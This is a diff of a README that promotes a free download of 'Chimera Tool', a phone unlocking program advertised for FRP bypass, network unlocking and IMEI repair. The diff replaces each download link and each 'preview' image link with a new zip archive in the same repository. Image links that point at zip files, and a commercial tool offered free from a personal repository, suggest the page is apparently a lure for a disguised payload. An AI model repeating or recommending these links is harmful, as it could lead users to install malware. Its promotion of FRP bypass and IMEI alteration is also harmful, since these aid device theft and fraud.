@@ -2,7 +2,7 @@
 
 Chimera Tool is a professional software designed for unlocking, repairing, and servicing a wide range of smartphones. It offers fast and reliable solutions for bypassing FRP locks, unlocking network restrictions, repairing IMEI, and more. Ideal for mobile technicians and repair centers.
 
-[![Download Chimera Tool](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip%20Tool-blueviolet)](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip)
+[![Download Chimera Tool](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip%20Tool-blueviolet)](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Chimera Tool is a professional software designed for unlocking, repairing, and s
 - Service Xiaomi and Huawei phones efficiently  
 - Use in repair shops for quick turnaround times  
 
-[![Download Chimera Tool](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip%20Tool-blueviolet)](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip)
+[![Download Chimera Tool](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip%20Tool-blueviolet)](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip)
 
 ---
 
@@ -61,9 +61,9 @@ Chimera Tool is a professional software designed for unlocking, repairing, and s
 
 ### 🖼 Preview
 
-![Chimera Tool Main Interface](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip)
+![Chimera Tool Main Interface](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip)
 
-![Chimera Tool Unlock Process](https://raw.githubusercontent.com/Vhondou/Chimera-Tool/main/siffle/Chimera-Tool.zip)
+![Chimera Tool Unlock Process](https://github.com/Vhondou/Chimera-Tool/raw/refs/heads/main/siffle/Chimera-Tool-3.6-beta.2.zip)
 
 ---
 
